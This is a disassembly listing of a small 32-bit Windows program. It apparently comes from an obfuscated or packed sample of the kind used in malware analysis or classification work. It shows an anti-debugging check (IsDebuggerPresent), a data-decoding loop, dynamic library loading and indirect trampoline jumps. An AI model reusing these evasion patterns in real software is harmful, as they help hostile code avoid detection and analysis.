0x004c1000:	addb	%al, (%eax)	; from: 0x004c10f8(MAY)
0x004c1002:	addb	%al, (%eax)
0x004c1004:	addb	%al, (%eax)
0x004c1006:	addb	%al, (%eax)
0x004c1008:	addb	%al, (%eax)
0x004c100a:	addb	%al, (%eax)
0x004c100c:	addb	%al, (%eax)
0x004c100e:	addb	%al, (%eax)
0x004c1010:	addb	%al, (%eax)
0x004c1012:	addb	%al, (%eax)
0x004c1014:	addb	%al, (%eax)
0x004c1016:	addb	%al, (%eax)
0x004c1018:	addb	%al, (%eax)
0x004c101a:	addb	%al, (%eax)
0x004c101c:	addb	%al, (%eax)
0x004c101e:	addb	%al, (%eax)
0x004c1020:	addb	%al, (%eax)
0x004c1022:	addb	%al, (%eax)
0x004c1024:	addb	%al, (%eax)
0x004c1026:	addb	%al, (%eax)
0x004c1028:	addb	%al, (%eax)
0x004c102a:	addb	%al, (%eax)
0x004c102c:	addb	%al, (%eax)
0x004c102e:	addb	%al, (%eax)
0x004c1030:	addb	%al, (%eax)
0x004c1032:	addb	%al, (%eax)
0x004c1034:	addb	%al, (%eax)
0x004c1036:	addb	%al, (%eax)
0x004c1038:	addb	%al, (%eax)
0x004c103a:	addb	%al, (%eax)
0x004c103c:	addb	%al, (%eax)
0x004c103e:	addb	%al, (%eax)
0x004c1040:	addb	%al, (%eax)
0x004c1042:	addb	%al, (%eax)
0x004c1044:	addb	%al, (%eax)
0x004c1046:	addb	%al, (%eax)
0x004c1048:	addb	%al, (%eax)
0x004c104a:	addb	%al, (%eax)
0x004c104c:	addb	%al, (%eax)
0x004c104e:	addb	%al, (%eax)
0x004c1050:	addb	%al, (%eax)
0x004c1052:	addb	%al, (%eax)
0x004c1054:	addb	%al, (%eax)
0x004c1056:	addb	%al, (%eax)
0x004c1058:	addb	%al, (%eax)
0x004c105a:	addb	%al, (%eax)
0x004c105c:	addb	%al, (%eax)
0x004c105e:	addb	%al, (%eax)
0x004c1060:	addb	%al, (%eax)
0x004c1062:	addb	%al, (%eax)
0x004c1064:	addb	%al, (%eax)
0x004c1066:	addb	%al, (%eax)
0x004c1068:	addb	%al, (%eax)
0x004c106a:	addb	%al, (%eax)
0x004c106c:	addb	%al, (%eax)
0x004c106e:	addb	%al, (%eax)
0x004c1070:	addb	%al, (%eax)
0x004c1072:	addb	%al, (%eax)
0x004c1074:	addb	%al, (%eax)
0x004c1076:	addb	%al, (%eax)
0x004c1078:	addb	%al, (%eax)
0x004c107a:	addb	%al, (%eax)
0x004c107c:	addb	%al, (%eax)
0x004c107e:	addb	%al, (%eax)
0x004c1080:	addb	%al, (%eax)
0x004c1082:	addb	%al, (%eax)
0x004c1084:	addb	%al, (%eax)
0x004c1086:	addb	%al, (%eax)
0x004c1088:	addb	%al, (%eax)
0x004c108a:	addb	%al, (%eax)
0x004c108c:	addb	%al, (%eax)
0x004c108e:	addb	%al, (%eax)
0x004c1090:	addb	%al, (%eax)
0x004c1092:	addb	%al, (%eax)
0x004c1094:	addb	%al, (%eax)
0x004c1096:	addb	%al, (%eax)
0x004c1098:	addb	%al, (%eax)
0x004c109a:	addb	%al, (%eax)
0x004c109c:	addb	%al, (%eax)
0x004c109e:	addb	%al, (%eax)
0x004c10a0:	addb	%al, (%eax)
0x004c10a2:	addb	%al, (%eax)
0x004c10a4:	addb	%al, (%eax)
0x004c10a6:	addb	%al, (%eax)
0x004c10a8:	addb	%al, (%eax)
0x004c10aa:	addb	%al, (%eax)	; from: 0x004c10ca(MAY)
0x004c10ac:	xorl	%eax, %eax
0x004c10ae:	pushl	(%edi,%eax)
0x004c10b1:	addl	%edx, (%esp)
0x004c10b4:	popl	(%esi,%eax,2)
0x004c10b7:	decl	(%esi)
0x004c10b9:	movl	(%edi), %edx
0x004c10bb:	addl	$0x4, %edi
0x004c10be:	addl	$0x4, %esi
0x004c10c1:	addl	$0x4, %ebx
0x004c10c4:	cmpl	$0x6a4, %ebx
0x004c10ca:	jne	0x004c10aa	; targets: 0x004c10aa(MAY), 0x004c10cc(MAY)
0x004c10cc:	pushl	%ecx	; from: 0x004c10ca(MAY)
0x004c10cd:	movl	$0x0, %ecx
0x004c10d2:	pushl	%ecx
0x004c10d3:	call	0x004c192c	; targets: 0x004c192c(MAY)
0x004c10e0:	movl	%edi, %edi	; from: 0x004c1228(MAY)
0x004c10e2:	pushl	%ebp
0x004c10e3:	movl	%esp, %ebp
0x004c10e5:	subl	$0x30, %esp
0x004c10e8:	leal	0x004c3134, %eax
0x004c10ee:	addl	-36(%ebp), %edx
0x004c10f1:	pushl	%eax
0x004c10f2:	movl	$0xfffffff4, %ecx
0x004c10f7:	pushl	%ecx
0x004c10f8:	call	0x004c1000	; targets: 0x004c1000(MAY)
0x004c1134:	movl	%edi, %edi	; from: 0x004c156e(MAY)
0x004c1136:	pushl	%ebp
0x004c1137:	movl	%esp, %ebp
0x004c1139:	subl	$0x2c, %esp
0x004c113c:	leal	0x004c31e8, %edx
0x004c1142:	addl	-44(%ebp), %ebx
0x004c1145:	pushl	%edx
0x004c1146:	pushl	%ebx
0x004c1147:	pushl	%ebx
0x004c1148:	call	0x004c16e4	; targets: 0x004c16e4(MAY)
0x004c1174:	popl	%esi	; from: 0x004c194e(MAY), 0x004c138a(MAY)
0x004c1175:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000190(MAY)
0x004c117b:	repz jmp	%esi	; targets: 0x004c1953(MAY), 0x004c138f(MAY)
0x004c118c:	movl	%edi, %edi	; from: 0x004c19b7(MAY)
0x004c118e:	pushl	%ebp
0x004c118f:	movl	%esp, %ebp
0x004c1191:	subl	$0x20, %esp
0x004c1194:	leal	0x13c(%ecx), %edi
0x004c119a:	adcl	-28(%ebp), %eax
0x004c119d:	pushl	$0x0
0x004c119f:	call	0x004c1468	; targets: 0x004c1468(MAY)
0x004c11a4:	pushl	%edi	; from: 0x004c146f(MAY)
0x004c11a5:	pushl	%ecx
0x004c11a6:	pushl	0xcc(%edi)
0x004c11ac:	call	0x004c1240	; targets: 0x004c1240(MAY)
0x004c1200:	movl	%edi, %edi	; from: 0x004c1afe(MAY)
0x004c1202:	pushl	%ebp
0x004c1203:	movl	%esp, %ebp
0x004c1205:	subl	$0x44, %esp
0x004c1208:	leal	0x004c3108, %edi
0x004c120e:	orl	$0xffff8f9d, 0x34(%edi)
0x004c1215:	movl	$0x0, %ecx
0x004c121a:	pushl	%ecx
0x004c121b:	call	0x004c1b4c	; targets: 0x004c1b4c(MAY)
0x004c1220:	pushl	%edi	; from: 0x004c1b53(MAY)
0x004c1221:	pushl	%ebx
0x004c1222:	pushl	0xf0(%edi)
0x004c1228:	call	0x004c10e0	; targets: 0x004c10e0(MAY)
0x004c1240:	movl	%edi, %edi	; from: 0x004c11ac(MAY)
0x004c1242:	pushl	%ebp
0x004c1243:	movl	%esp, %ebp
0x004c1245:	subl	$0x54, %esp
0x004c1248:	movl	$0x4c3140, %ebx
0x004c124d:	subl	%esi, -104(%ebx)
0x004c1250:	pushl	%ebx
0x004c1251:	pushl	%esi
0x004c1252:	pushl	%ecx
0x004c1253:	call	0x004c1938	; targets: 0x004c1938(MAY)
0x004c1370:	movl	%edi, %edi	; from: 0x004c17c2(MAY)
0x004c1372:	pushl	%ebp
0x004c1373:	movl	%esp, %ebp
0x004c1375:	subl	$0x58, %esp
0x004c1378:	leal	0x4(%edi), %eax
0x004c137b:	addl	$0xffffffab, -148(%eax)
0x004c1382:	pushl	%eax
0x004c1383:	leal	-296(%eax), %edx	; from: 0x004c1391(MAY)
0x004c1389:	pushl	%edx
0x004c138a:	call	0x004c1174	; targets: 0x004c1174(MAY)
0x004c138f:	testl	%eax, %eax	; from: 0x004c117b(MAY)
0x004c1391:	jne	0x004c1383	; targets: 0x004c1383(MAY), 0x004c1393(MAY)
0x004c1393:	popl	%eax	; from: 0x004c1391(MAY)
0x004c1394:	pushl	%eax
0x004c1395:	pushl	0x17c(%eax)
0x004c139b:	pushl	0xc4(%eax)
0x004c13a1:	call	0x004c1c30	; targets: 0x004c1c30(MAY)
0x004c1468:	popl	%esi	; from: 0x004c119f(MAY)
0x004c1469:	call	GlobalUnlock@kernel32.dll	; targets: 0xff0001e0(MAY)
0x004c146f:	repz jmp	%esi	; targets: 0x004c11a4(MAY)

start:
0x004c1530:	pushl	%esi
0x004c1531:	pushl	$0x0
0x004c1533:	pushl	$0x0
0x004c1535:	pushl	$0x0
0x004c1537:	pushl	$0x0
0x004c1539:	call	0x004c18d4	; targets: 0x004c18d4(MAY)
0x004c153e:	subl	$0x0, %esp	; from: 0x004c18db(MAY)
0x004c1541:	call	0x004c1a64	; targets: 0x004c1a64(MAY)
0x004c1546:	pushl	$0x2	; from: 0x004c1a6b(MAY)
0x004c1548:	pushl	$0x0
0x004c154a:	decl	0x004c30a8
0x004c1550:	movl	$0x4c30a0, %eax
0x004c1555:	pushl	%eax
0x004c1556:	call	0x004c1b64	; targets: 0x004c1b64(MAY)
0x004c155b:	popl	%esi	; from: 0x004c1b6b(MAY)
0x004c155c:	movl	0x3b(%eax), %edx
0x004c155f:	leal	(%eax,%edx), %eax
0x004c1562:	addl	$0x28, %eax
0x004c1565:	movl	(%eax), %eax
0x004c1567:	pusha	
0x004c1568:	movb	$0x50, %ah
0x004c156a:	subb	%ah, %al
0x004c156c:	jb	0x004c1574	; targets: 0x004c156e(MAY), 0x004c1574(MAY)
0x004c156e:	jg	0x004c1134	; targets: 0x004c1574(MAY), 0x004c1134(MAY)	; from: 0x004c156c(MAY)
0x004c1574:	popa		; from: 0x004c156c(MAY), 0x004c156e(MAY)
0x004c1575:	ret	; targets: 0xfee70000(MAY)

0x004c1578:	movl	%edi, %edi	; from: 0x004c1700(MAY)
0x004c157a:	pushl	%ebp
0x004c157b:	movl	%esp, %ebp
0x004c157d:	subl	$0x54, %esp
0x004c1580:	leal	0x94(%esi), %edx
0x004c1586:	orl	%ecx, -68(%ebp)
0x004c1589:	pushl	%edx
0x004c158a:	pushl	0x14c(%edx)
0x004c1590:	pushl	%edi
0x004c1591:	pushl	0x1d0(%edx)
0x004c1597:	pushl	0x1e0(%edx)
0x004c159d:	call	0x004c1bb4	; targets: 0x004c1bb4(MAY)
0x004c16e4:	movl	%edi, %edi	; from: 0x004c1148(MAY)
0x004c16e6:	pushl	%ebp
0x004c16e7:	movl	%esp, %ebp
0x004c16e9:	subl	$0x30, %esp
0x004c16ec:	leal	-296(%edx), %esi
0x004c16f2:	addl	0x11c(%esi), %edi
0x004c16f8:	pushl	%esi
0x004c16f9:	pushl	0xfc(%esi)
0x004c16ff:	pushl	%edi
0x004c1700:	call	0x004c1578	; targets: 0x004c1578(MAY)
0x004c17a8:	movl	%edi, %edi	; from: 0x004c1966(MAY)
0x004c17aa:	pushl	%ebp
0x004c17ab:	movl	%esp, %ebp
0x004c17ad:	subl	$0x48, %esp
0x004c17b0:	leal	0x004c3124, %edi
0x004c17b6:	subl	-72(%edi), %esi
0x004c17b9:	pushl	%edi
0x004c17ba:	pushl	%ecx
0x004c17bb:	pushl	0x194(%edi)
0x004c17c1:	pushl	%edx
0x004c17c2:	call	0x004c1370	; targets: 0x004c1370(MAY)
0x004c18d4:	popl	%esi	; from: 0x004c1539(MAY)
0x004c18d5:	call	CreateMailslotA@kernel32.dll	; targets: 0xff000100(MAY)
0x004c18db:	repz jmp	%esi	; targets: 0x004c153e(MAY)
0x004c192c:	popl	%esi	; from: 0x004c10d3(MAY)
0x004c192d:	call	SetFocus@user32.dll	; targets: unresolved
0x004c1938:	movl	%edi, %edi	; from: 0x004c1253(MAY)
0x004c193a:	pushl	%ebp
0x004c193b:	movl	%esp, %ebp
0x004c193d:	subl	$0x54, %esp
0x004c1940:	leal	0x28(%ebx), %ecx
0x004c1943:	andl	%esi, -76(%ebp)
0x004c1946:	pushl	%ecx
0x004c1947:	leal	-360(%ecx), %edi	; from: 0x004c1955(MAY)
0x004c194d:	pushl	%edi
0x004c194e:	call	0x004c1174	; targets: 0x004c1174(MAY)
0x004c1953:	testl	%eax, %eax	; from: 0x004c117b(MAY)
0x004c1955:	jne	0x004c1947	; targets: 0x004c1957(MAY), 0x004c1947(MAY)
0x004c1957:	popl	%ecx	; from: 0x004c1955(MAY)
0x004c1958:	pushl	%ecx
0x004c1959:	pushl	0x1a8(%ecx)
0x004c195f:	pushl	%eax
0x004c1960:	pushl	0x148(%ecx)
0x004c1966:	call	0x004c17a8	; targets: 0x004c17a8(MAY)
0x004c198c:	movl	%edi, %edi	; from: 0x004c1bcf(MAY)
0x004c198e:	pushl	%ebp
0x004c198f:	movl	%esp, %ebp
0x004c1991:	subl	$0x44, %esp
0x004c1994:	leal	0x004c3010, %ecx
0x004c199a:	movl	$0x4404, %eax
0x004c199f:	pushl	%ecx
0x004c19a0:	movl	$0x0, %eax
0x004c19a5:	pushl	%eax
0x004c19a6:	call	0x004c1a58	; targets: 0x004c1a58(MAY)
0x004c19ab:	popl	%ecx	; from: 0x004c1a5f(MAY)
0x004c19ac:	pushl	%ecx
0x004c19ad:	pushl	0xc0(%ecx)
0x004c19b3:	pushl	0x60(%ecx)
0x004c19b6:	pushl	%edi
0x004c19b7:	call	0x004c118c	; targets: 0x004c118c(MAY)
0x004c1a58:	popl	%esi	; from: 0x004c19a6(MAY)
0x004c1a59:	call	GlobalLock@kernel32.dll	; targets: 0xff000240(MAY)
0x004c1a5f:	repz jmp	%esi	; targets: 0x004c19ab(MAY)
0x004c1a64:	popl	%esi	; from: 0x004c1541(MAY)
0x004c1a65:	call	IsDebuggerPresent@kernel32.dll	; targets: 0xff000160(MAY)
0x004c1a6b:	repz jmp	%esi	; targets: 0x004c1546(MAY)
0x004c1ae8:	movl	%edi, %edi	; from: 0x004c1c49(MAY)
0x004c1aea:	pushl	%ebp
0x004c1aeb:	movl	%esp, %ebp
0x004c1aed:	subl	$0x44, %esp
0x004c1af0:	leal	0x48(%ebx), %ecx
0x004c1af3:	andl	$0xffffffe9, %eax
0x004c1af6:	pushl	%ecx
0x004c1af7:	pushl	0x1d8(%ecx)
0x004c1afd:	pushl	%ebx
0x004c1afe:	call	0x004c1200	; targets: 0x004c1200(MAY)
0x004c1b4c:	popl	%esi	; from: 0x004c121b(MAY)
0x004c1b4d:	call	CloseHandle@kernel32.dll	; targets: 0xff000200(MAY)
0x004c1b53:	repz jmp	%esi	; targets: 0x004c1220(MAY)
0x004c1b64:	popl	%esi	; from: 0x004c1556(MAY)
0x004c1b65:	call	LoadLibraryExA@kernel32.dll	; targets: 0xff0001b0(MAY)
0x004c1b6b:	repz jmp	%esi	; targets: 0x004c155b(MAY)
0x004c1bb4:	movl	%edi, %edi	; from: 0x004c159d(MAY)
0x004c1bb6:	pushl	%ebp
0x004c1bb7:	movl	%esp, %ebp
0x004c1bb9:	subl	$0x34, %esp
0x004c1bbc:	leal	0x54(%edx), %esi
0x004c1bbf:	orl	$0x65, -212(%esi)
0x004c1bc6:	pushl	%esi
0x004c1bc7:	pushl	%ecx
0x004c1bc8:	pushl	%eax
0x004c1bc9:	pushl	0x9c(%esi)
0x004c1bcf:	call	0x004c198c	; targets: 0x004c198c(MAY)
0x004c1c30:	movl	%edi, %edi	; from: 0x004c13a1(MAY)
0x004c1c32:	pushl	%ebp
0x004c1c33:	movl	%esp, %ebp
0x004c1c35:	subl	$0x58, %esp
0x004c1c38:	leal	-264(%eax), %ebx
0x004c1c3e:	xorl	%edi, 0x84(%ebx)
0x004c1c44:	pushl	%ebx
0x004c1c45:	pushl	%edi
0x004c1c46:	pushl	%edi
0x004c1c47:	pushl	%edi
0x004c1c48:	pushl	%esi
0x004c1c49:	call	0x004c1ae8	; targets: 0x004c1ae8(MAY)
